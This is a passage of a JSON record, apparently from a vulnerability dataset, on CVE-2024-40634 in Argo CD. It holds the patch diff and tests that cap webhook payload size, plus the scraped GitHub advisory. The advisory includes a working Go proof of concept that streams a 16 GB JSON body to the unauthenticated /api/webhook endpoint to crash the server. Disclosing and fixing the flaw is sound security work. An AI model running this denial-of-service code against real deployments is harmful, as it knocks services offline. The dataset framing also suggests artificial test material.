github.New(github.Options.Secret(set.WebhookGitHubSecret))\n \tif err != nil {\n \t\tlog.Warnf(\"Unable to init the GitHub webhook\")\n\n@@ -114,6 +118,8 @@\nfunc NewHandler(namespace string, applicationNamespaces []string, appClientset a\n \t\trepoCache:              repoCache,\n \t\tserverCache:            serverCache,\n \t\tdb:                     argoDB,\n+\t\tqueue:                  make(chan interface{}, payloadQueueSize),\n+\t\tmaxWebhookPayloadSizeB: maxWebhookPayloadSizeB,\n \t}\n \n \treturn &acdWebhook\n\n@@ -458,6 +464,8 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \tvar payload interface{}\n \tvar err error\n \n+\tr.Body = http.MaxBytesReader(w, r.Body, a.maxWebhookPayloadSizeB)\n+\n \tswitch {\n \tcase r.Header.Get(\"X-Vss-Activityid\") != \"\":\n \t\tif err = a.azuredevopsAuthHandler(r); err != nil {\n\n@@ -500,6 +508,14 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \t}\n \n \tif err != nil {\n+\t\t// If the error is due to a large payload, return a more user-friendly error message\n+\t\tif err.Error() == \"error parsing payload\" {\n+\t\t\tmsg := fmt.Sprintf(\"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under %v MB) and ensure it is valid JSON\", a.maxWebhookPayloadSizeB/1024/1024)\n+\t\t\tlog.WithField(common.SecurityField, common.SecurityHigh).Warn(msg)\n+\t\t\thttp.Error(w, msg, http.StatusBadRequest)\n+\t\t\treturn\n+\t\t}\n+\n \t\tlog.Infof(\"Webhook processing failed: %s\", err)\n \t\tstatus := http.StatusBadRequest\n \t\tif r.Method != http.MethodPost {\n```\n\nFilename: util/webhook/webhook_test.go:\n```\n@@ -4,6 +4,7 @@\nimport (\n \t\"bytes\"\n \t\"encoding/json\"\n \t\"fmt\"\n+\t\"github.com/stretchr/testify/require\"\n \t\"io\"\n \t\"net/http\"\n \t\"net/http/httptest\"\n\n@@ -56,6 +57,11 @@\ntype reactorDef struct {\n }\n \n func NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects ...runtime.Object) *ArgoCDWebhookHandler {\n+\tdefaultMaxPayloadSize := int64(1) * 1024 * 1024 * 1024\n+\treturn NewMockHandlerWithPayloadLimit(reactor, applicationNamespaces, defaultMaxPayloadSize, objects...)\n+}\n+\n+func NewMockHandlerWithPayloadLimit(reactor *reactorDef, applicationNamespaces []string, maxPayloadSize int64, objects ...runtime.Object) *ArgoCDWebhookHandler {\n \tappClientset := appclientset.NewSimpleClientset(objects...)\n \tif reactor != nil {\n \t\tdefaultReactor := appClientset.ReactionChain[0]\n\n@@ -71,7 +77,7 @@\nfunc NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects\n \t\tcacheClient,\n \t\t1*time.Minute,\n \t\t1*time.Minute,\n-\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{})\n+\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{}, maxPayloadSize)\n }\n \n func TestGitHubCommitEvent(t *testing.T) {\n\n@@ -391,8 +397,9 @@\nfunc TestInvalidEvent(t *testing.T) {\n \treq.Header.Set(\"X-GitHub-Event\", \"push\")\n \tw := httptest.NewRecorder()\n \th.Handler(w, req)\n-\tassert.Equal(t, w.Code, http.StatusBadRequest)\n-\texpectedLogResult := \"Webhook processing failed: error parsing payload\"\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 1024 MB) and ensure it is valid JSON\"\n \tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n \tassert.Equal(t, expectedLogResult+\"\\n\", w.Body.String())\n \thook.Reset()\n\n@@ -683,3 +690,21 @@\nfunc Test_getWebUrlRegex(t *testing.T) {\n \t\t})\n \t}\n }\n+\n+func TestGitHubCommitEventMaxPayloadSize(t *testing.T) {\n+\thook := test.NewGlobal()\n+\tmaxPayloadSize := int64(100)\n+\th := NewMockHandlerWithPayloadLimit(nil, []string{}, maxPayloadSize)\n+\treq := httptest.NewRequest(http.MethodPost, \"/api/webhook\", nil)\n+\treq.Header.Set(\"X-GitHub-Event\", \"push\")\n+\teventJSON, err := os.ReadFile(\"testdata/github-commit-event.json\")\n+\trequire.NoError(t, err)\n+\treq.Body = io.NopCloser(bytes.NewReader(eventJSON))\n+\tw := httptest.NewRecorder()\n+\th.Handler(w, req)\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 0 MB) and ensure it is valid JSON\"\n+\tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n+\thook.Reset()\n+}\n```"
            }
        ],
        "sw_version": "v1.0.0",
        "sw_version_wget": "https://github.com/argoproj/argo-cd/archive/refs/tags/v1.0.0.zip",
        "description": "Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments. This vulnerability is fixed in 2.11.6, 2.10.15, and 2.9.20.\n",
        "sec_adv": [
            {
                "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nargoproj\n/\nargo-cd\nPublic\nNotifications You must be signed in to change notification settings\nFork 6k\nStar 19.5k\nCode\nIssues\n3.2k\nPull requests\n468\nDiscussions\nActions\nProjects\n5\nWiki\nSecurity\n43\nInsights\nAdditional navigation options\nUnauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint in Argo CD\nHigh pasha-codefresh published GHSA-jmvp-698c-4x3w on Jul 22, 2024Jul 22, 2024\nPackage\ngomod Argo CD\n(\nGo\n)\nAffected versions\n> 1.0.0\nPatched versions\n2.11.6, 2.10.15, 2.9.20\nDescription\nSummary\nThis report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.\nDetails\nThe webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.\nThe fix would be to enforce a limit on the size of the request being parsed.\nPoC\nPort-forward to the argocd-server service, like so:\nkubectl port-forward svc/argocd-server -n argocd 8080:443\nRun the below code:\npackage main\n\nimport (\n \"crypto/tls\"\n \"io\"\n \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n size int64 // Total size to generate\n read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n if r.read >= r.size {\n  return 0, io.EOF // Finished generating\n }\n\n start := false\n if r.read == 0 {\n  // Start of JSON\n  p[0] = '{'\n  p[1] = '\"'\n  p[2] = 'd'\n  p[3] = 'a'\n  p[4] = 't'\n  p[5] = 'a'\n  p[6] = '\"'\n  p[7] = ':'\n  p[8] = '\"'\n  n = 9\n  start = true\n }\n\n for i := n; i < len(p); i++ {\n  if r.read+int64(i)-int64(n)+1 == r.size-1 {\n   // End of JSON\n   p[i] = '\"'\n   p[i+1] = '}'\n   r.read += int64(i) + 2 - int64(n)\n   return i + 2 - n, nil\n  } else {\n   p[i] = 'x' // Dummy data\n  }\n }\n\n r.read += int64(len(p)) - int64(n)\n if start {\n  return len(p), nil\n }\n return len(p) - n, nil\n}\n\nfunc main() {\n // Initialize the custom reader with the desired size (16GB in this case).\n payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n reader := &DummyJSONReader{size: payloadSize}\n\n // HTTP client setup\n httpClient := &http.Client{\n  Timeout: 0, // No timeout\n  Transport: &http.Transport{\n   TLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n  },\n }\n\n req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n if err != nil {\n  panic(err)\n }\n\n // Set headers\n req.Header.Set(\"Content-Type\", \"application/json\")\n req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n resp, err := httpClient.Do(req)\n if err != nil {\n  panic(err)\n }\n defer resp.Body.Close()\n\n println(\"Response status code:\", resp.StatusCode)\n}\nPatches\nA patch for this vulnerability has been released in the following Argo CD versions:\nv2.11.6\nv2.10.15\nv2.9.20\nFor more information\nIf you have any questions or comments about this advisory:\nOpen an issue in the Argo CD issue tracker or discussions\nJoin us on Slack in channel #argo-cd\nCredits\nThis vulnerability was found & reported by Jakub Ciolek\nThe Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nCVE ID\nCVE-2024-40634\nWeaknesses\nCWE-400\nCredits\njake-ciolek\nReporter\ncrenshaw-dev\nRemediation reviewer\npasha-codefresh\nRemediation developer\nFooter\nÂ© 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept in the form of sample exploit code."
            }
        ],
        "cwe": [
            {
                "id": "CWE-400",
                "value": "CWE-400: Uncontrolled Resource Consumption"
            }
        ]
    }
}